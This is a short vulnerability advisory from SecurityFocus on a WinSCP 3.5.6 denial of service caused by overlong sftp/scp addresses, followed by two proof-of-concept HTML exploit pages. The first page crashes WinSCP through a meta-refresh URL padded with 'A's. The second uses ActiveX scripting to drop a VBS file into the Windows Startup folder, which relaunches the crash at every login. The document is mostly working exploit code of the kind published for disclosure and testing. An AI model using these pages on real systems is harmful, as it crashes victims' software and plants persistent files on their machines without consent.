@@ -1,0 +1,66 @@
+source: http://www.securityfocus.com/bid/10160/info
+
+It has been reported that WinSCP may be prone to a denial of service condition resulting from memory corruption. This issue occurs when the application attempts to handle excessively long 'sftp:' or 'scp' addresses.
+
+WinSCP 3.5.6 is reported to be vulnerable to this issue, however, it is possible that other versions are affected as well.
+
+------ WinSCP_DoS1.html --------
+
+<HTML>
+<HEAD>
+<TITLE>WinSCP DoS</TITLE>
+
+<meta http-equiv="Refresh" content="0; URL=sftp://AAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
+
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
+
+-------- WinSCP_DoS2.html -------
+
+<html>
+  <head>
+   <title>WinSCP DoS</title>
+
+ <script language="JScript">
+
+     var WshShell = new ActiveXObject("WScript.Shell");
+     strSU = WshShell.SpecialFolders("StartUp");
+
+     var fso = new ActiveXObject("Scripting.FileSystemObject");
+     var vibas = fso.CreateTextFile(strSU + "\\WinSCPDoS.vbs",true);
+
+     vibas.WriteLine("Dim shell");
+     vibas.WriteLine("Dim quote");
+     vibas.WriteLine("Dim DoS");
+     vibas.WriteLine("Dim param");
+     vibas.WriteLine("DoS = \"C:\\Programmi\\WinSCP3\\WinSCP3.exe\"");
+     vibas.WriteLine("param = \"scp://AAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"");
+     vibas.WriteLine("set shell = WScript.CreateObject(\"WScript.Shell\")");
+     vibas.WriteLine("quote = Chr(34)");
+     vibas.WriteLine("pgm = \"explorer\"");
+     vibas.WriteLine("shell.Run quote & DoS & quote & \" \" & param");
+
+     vibas.Close();
+
+    </script>
+
+  </head>
+</html>
